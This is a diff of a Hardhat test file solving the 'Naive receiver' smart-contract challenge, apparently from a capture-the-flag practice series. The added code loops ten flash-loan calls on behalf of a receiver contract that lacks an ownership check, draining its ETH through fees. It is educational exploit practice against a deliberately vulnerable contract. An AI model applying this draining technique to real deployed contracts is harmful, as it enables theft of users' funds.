@@ -42,16 +42,11 @@ describe('[Challenge] Naive receiver', function () {
     it('Execution', async function () {
         const ETH = await pool.ETH();
         
-        await receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
-        // I guess the simple solution is to call the function about 10 times to
-        // drain all of 10 ETH out of the user's contract.
-        // But we have to think better than that.
-
-        // I think a recursive loop where the function call back the lender to
-        // take another flash loan.
-
-
+        // so anyone is able to call the receiver's contract because there is no ownership check.
         
+        for(var i=0; i < 10; ++i) {
+            await pool.connect(player).flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        }
     });
 
     after(async function () {
